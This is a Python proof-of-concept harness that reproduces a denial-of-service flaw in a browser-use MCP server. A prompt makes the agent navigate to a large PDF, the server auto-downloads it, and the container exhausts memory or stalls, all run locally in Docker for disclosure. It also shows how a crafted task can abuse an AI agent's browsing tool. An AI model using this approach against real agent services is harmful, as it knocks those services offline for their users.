#!/usr/bin/env python3
"""Prompt/task-driven PoC for browser-use MCP PDF auto-download DoS."""

from __future__ import annotations

import argparse
import datetime as dt
import json
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
LAB = ROOT / "pocs" / "browser_use_pdf_dos"
EVIDENCE = Path(__file__).resolve().parent / "screenshots"
IMAGE = "browser-use-pdf-dos-poc:local"
CONTAINER = "browser-use-pdf-dos-unavail"
TARGET_URL = "http://127.0.0.1:8765/poc.pdf"
TASK = (
    "Please open and inspect the PDF document at {url}. "
    "Use the browser navigation tool first, wait for the document to load, "
    "and then tell me whether it is accessible."
)


def docker_path(path: Path) -> str:
    return path.resolve().as_posix()


def now() -> str:
    return dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(message: str) -> None:
    print(f"[{now()}] {message}", flush=True)


def run(cmd: list[str], check: bool = True, timeout: int | None = None) -> subprocess.CompletedProcess[str]:
    try:
        proc = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired as exc:
        stdout = exc.stdout if isinstance(exc.stdout, str) else ""
        stderr = exc.stderr if isinstance(exc.stderr, str) else ""
        stderr = f"{stderr}\nTimeoutExpired after {timeout}s".strip()
        return subprocess.CompletedProcess(cmd, 124, stdout, stderr)
    if check and proc.returncode != 0:
        print(proc.stdout, end="")
        print(proc.stderr, end="", file=sys.stderr)
        raise SystemExit(proc.returncode)
    return proc


def build_image() -> None:
    run(["docker", "build", "-t", IMAGE, str(LAB)])


def parse_evidence(stdout: str) -> dict:
    for line in stdout.splitlines():
        if line.startswith("EVIDENCE_JSON="):
            return json.loads(line.split("=", 1)[1])
    return {}


def resource_attack(size_mb: int) -> int:
    log(f"attack_start browser-use MCP PDF auto-download resource amplification size={size_mb}MB")
    log(f"agent_task={TASK.format(url=TARGET_URL)}")
    log(f"tool_call=browser_navigate target={TARGET_URL}")
    proc = run(
        [
            "docker",
            "run",
            "--rm",
            "--shm-size=512m",
            "-v",
            f"{docker_path(EVIDENCE)}:/evidence",
            IMAGE,
            "python",
            "/poc/run_poc.py",
            "--size-mb",
            str(size_mb),
            "--evidence-out",
            f"/evidence/evidence_{size_mb}mb.json",
        ],
        check=False,
    )
    evidence = parse_evidence(proc.stdout)
    mcp = evidence.get("mcp", {})
    pdf_bytes = evidence.get("served_pdf_bytes", 0)
    disk_growth = evidence.get("download_dir_growth_bytes", 0)
    rss_before = mcp.get("tree_rss_before_mb", 0)
    rss_after = mcp.get("tree_rss_after_mb", 0)
    reproduced = proc.returncode == 0 and disk_growth >= pdf_bytes > 0

    log(f"pdf_bytes={pdf_bytes} download_dir_growth_bytes={disk_growth}")
    log(f"tree_rss_before_mb={rss_before} tree_rss_after_mb={rss_after}")
    log(f"RESULT={'RESOURCE_AMPLIFICATION_CONFIRMED' if reproduced else 'NEEDS_REVIEW'}")
    return 0 if reproduced else 2


def inspect_container() -> tuple[dict, str]:
    inspect_proc = run(["docker", "inspect", CONTAINER], check=False)
    inspected = json.loads(inspect_proc.stdout)[0] if inspect_proc.returncode == 0 else {}
    stats_proc = run(
        [
            "docker",
            "stats",
            "--no-stream",
            "--format",
            "mem={{.MemUsage}} mem_percent={{.MemPerc}} cpu={{.CPUPerc}}",
            CONTAINER,
        ],
        check=False,
        timeout=10,
    )
    return inspected, stats_proc.stdout.strip()


def unavailable_attack(size_mb: int, memory: str, client_deadline_sec: int) -> int:
    log(
        "attack_start browser-use MCP PDF auto-download service unavailable "
        f"size={size_mb}MB memory={memory} client_deadline_sec={client_deadline_sec}"
    )
    log(f"agent_task={TASK.format(url=TARGET_URL)}")
    log(f"tool_call=browser_navigate target={TARGET_URL}")
    run(["docker", "rm", "-f", CONTAINER], check=False)
    proc = run(
        [
            "docker",
            "run",
            "--name",
            CONTAINER,
            f"--memory={memory}",
            "--shm-size=512m",
            "-v",
            f"{docker_path(EVIDENCE)}:/evidence",
            IMAGE,
            "python",
            "/poc/run_poc.py",
            "--size-mb",
            str(size_mb),
            "--evidence-out",
            f"/evidence/evidence_{size_mb}mb_{memory}.json",
        ],
        check=False,
        timeout=client_deadline_sec,
    )
    inspected, stats = inspect_container()
    state = inspected.get("State", {})
    host_config = inspected.get("HostConfig", {})
    oom_killed = bool(state.get("OOMKilled"))
    deadline_expired = proc.returncode == 124
    completed = proc.returncode == 0

    log(f"served_pdf_bytes={size_mb * 1024 * 1024}")
    log(f"browser_navigate_completed={str(completed).lower()} docker_run_exit_code={proc.returncode}")
    log(f"container_memory_limit_bytes={host_config.get('Memory', 0)}")
    if stats and state.get("Status") == "running":
        log(f"container_stats {stats}")
    log(
        f"container_status={state.get('Status')} "
        f"container_oom_killed={str(oom_killed).lower()} "
        f"container_exit_code={state.get('ExitCode')}"
    )
    if oom_killed:
        log("service_probe=browser-use MCP container running=false")
        log("SERVICE_UNAVAILABLE detail=browser-use MCP container exited during PDF navigation")
    elif deadline_expired:
        log(f"service_probe=browser_navigate completed=false deadline_sec={client_deadline_sec}")
        log("SERVICE_UNAVAILABLE detail=browser_navigate did not return within the client deadline")

    unavailable = oom_killed or deadline_expired
    result = "REPRODUCED_SERVICE_UNAVAILABLE" if unavailable else "NEEDS_REVIEW"
    log(f"RESULT={result}")
    run(["docker", "rm", "-f", CONTAINER], check=False)
    return 0 if unavailable else 2


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=["resource", "unavailable"])
    parser.add_argument("--build", action="store_true", help="Build the local Docker image before running")
    parser.add_argument("--size-mb", type=int, default=0)
    parser.add_argument("--memory", default="1g")
    parser.add_argument("--client-deadline-sec", type=int, default=120)
    args = parser.parse_args()

    EVIDENCE.mkdir(parents=True, exist_ok=True)
    if args.build:
        build_image()

    if args.mode == "resource":
        return resource_attack(args.size_mb or 20)
    return unavailable_attack(args.size_mb or 50, args.memory, args.client_deadline_sec)


if __name__ == "__main__":
    raise SystemExit(main())
